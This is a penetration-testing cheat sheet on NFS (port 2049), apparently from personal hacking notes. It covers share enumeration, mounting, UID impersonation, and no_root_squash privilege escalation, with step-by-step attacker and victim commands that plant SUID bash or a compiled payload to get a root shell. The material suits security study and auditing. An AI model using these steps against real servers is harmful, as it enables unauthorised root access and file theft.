---
Ports: 2049
Description: It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.
---

# Enumeration

- [NSE (Nmap Scripting Engine)](../Tools/nmap.md#NSE%20(Nmap%20Scripting%20Engine))

```bash
nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share
```

- [msfconsole (auxiliary modules)](../Tools/msfconsole.md#Auxiliary%20Modules)

```bash
scanner/nfs/nfsmount #Scan NFS mounts and list permissions
```

## Mounting

- [showmount](../Tools/showmount.md)

```
showmount -e <IP>	# To know which folder has the server available to mount you an ask it using:
```

- mount

```
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock

# Example
mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
```

---

# Exploitation

## Permissions

If you mount a folder which contains **files or folders only accessible by some user** (by **UID**). You can **create** **locally** a user with that **UID** and using that **user** you will be able to **access** the file/folder.

---

# Privilege Escalation

## NFS no_root_squash/no_all_squash misconfiguration PE (Remote)

Read the `/etc/exports` file, if you find some directory that is configured as `no_root_squash`, then **you can access it from as a client and write inside that directory as if you were the local root** of the machine.

**`no_root_squash`**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.

**`no_all_squash`**: This is similar to `no_root_squash` option but applies to non-root users. Imagine, you have a shell as nobody user; checked `/etc/exports` file; no_all_squash option is present; check `/etc/passwd` file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.

- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **`/bin/bash`** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary. [^1]

[^1]: [C](../Web%20&%20Network%20Hacking/Shell%20Cheatsheet.md#C)

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

## NFS no_root_squash/no_all_squash misconfiguration PE (Local)

- https://www.errno.fr/nfs_privesc.html
- [https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe#local-exploit](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe#local-exploit)

---

# Misc

## Config files

```
/etc/exports
/etc/lib/nfs/etab
```

## Other tools

- [NFSShell](https://github.com/NetDirect/nfsshell) (to easily list, mount and change UID and GID to have access to files)